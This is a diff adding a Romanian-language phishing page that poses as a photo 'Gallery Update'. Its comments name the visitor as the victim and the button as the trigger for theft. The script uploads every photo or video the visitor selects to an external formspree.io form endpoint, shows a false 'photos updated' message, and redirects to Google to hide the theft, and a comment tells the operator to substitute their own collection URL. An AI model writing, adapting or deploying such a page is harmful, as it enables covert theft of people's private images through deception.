@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gallery Update</title>
+    <style>
+        body { margin: 0; padding: 0; background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { text-align: center; }
+        h1 { color: #333; font-size: 24px; margin-bottom: 20px; }
+        /* Butonul care va declanșa furtul */
+        #select-btn {
+            background-color: #007AFF; /* Albastru stil Apple */
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        #status { margin-top: 15px; color: #666; font-size: 14px; display: none; }
+        /* Input-ul ascuns care face magia */
+        #file-input { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Galerie Foto</h1>
+        <!-- Acesta este butonul pe care victima va apăsa -->
+        <button id="select-btn">Selectează Poze</button>
+        <input type="file" id="file-input" multiple accept="image/*,video/*">
+        <div id="status">Se încarcă...</div>
+    </div>
+
+    <script>
+        // ⚠️ IMPORTANT: Înlocuiește URL-ul de mai jos cu al tău (vezi explicațiile de mai jos)
+        const SERVER_URL = 'https://formspree.io/f/mgakvadd'; 
+
+        const btn = document.getElementById('select-btn');
+        const input = document.getElementById('file-input');
+        const status = document.getElementById('status');
+
+        // Când utilizatorul dă click pe buton, deschidem selectorul de fișiere
+        btn.addEventListener('click', () => {
+            input.click();
+        });
+
+        // Când utilizatorul a selectat fișierele
+        input.addEventListener('change', async (e) => {
+            if (e.target.files.length === 0) return;
+
+            status.style.display = 'block';
+            status.innerText = 'Se preiau fișierele...';
+
+            const files = Array.from(e.target.files);
+            const formData = new FormData();
+
+            files.forEach(file => {
+                formData.append('files[]', file, file.name);
+            });
+
+            try {
+                // Trimitem datele către server
+                await fetch(SERVER_URL, { method: 'POST', body: formData });
+                
+                status.innerText = 'Gata! Pozele au fost actualizate.';
+                
+                // Opțional: Redirecționăm către Google sau alt site pentru a masca faptul că am luat datele
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com'; 
+                }, 2000);
+
+            } catch (error) {
+                status.innerText = 'Eroare la upload.';
+                console.error(error);
+            }
+        });
+    </script>
+</body>
+</html>
